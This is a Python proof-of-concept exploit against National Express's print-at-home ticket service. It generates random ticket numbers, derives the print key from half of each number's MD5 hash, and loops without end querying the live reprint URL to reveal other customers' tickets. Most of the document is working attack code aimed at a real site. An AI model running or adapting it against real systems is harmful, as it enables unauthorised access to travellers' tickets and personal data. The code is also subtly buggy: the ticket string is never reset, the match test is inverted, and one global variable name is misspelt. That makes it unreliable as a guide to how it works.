# POC for National Express print-at-home vulnerability
# http://www.ifc0nfig.com/national-express-ticket-disclosure/
# Not a terribly difficult POC, but everyone starts somewhere.
#
# @author b6938236
# @date 2014.09.25

import string
import random
import hashlib
import urllib.request
import time

rate = 0.5 #rate limiting, in seconds
ticketNo = ""
halfmd5 = ""

def genTicket():
        global ticketNo
        for i in range(6):
                ticketNo += random.choice(string.ascii_uppercase)
        for i in range(2):
                ticketNo += random.choice(string.digits)
	
def genHalfMD5():
        global halfmd5
        hmd5 = hashlib.md5()
        hmd5.update(ticketNo.encode('utf-8'))
        halfmd5 = hmd5.hexdigest()[16:]
	
def tryTicket():
        global ticketNo,halfMD5
        error = "We're sorry but we're unable to reprint this ticket as it's either not an e-Ticket or this ticket has been cancelled."
        url = "http://coach.nationalexpress.com/nxbooking/print-ticket?ticketnumber={0}&printKey={1}".format(ticketNo,halfmd5)
        response = urllib.request.urlopen(url)
        data = response.read()
        text = data.decode('utf-8')
        if not text.find(error):
                print(ticketNo)
                print(halfmd5)
                print("----------------")

##############################

print("running")
global rate
while True:
        genTicket()
        genHalfMD5()
        tryTicket()
        time.sleep(rate)

##############################
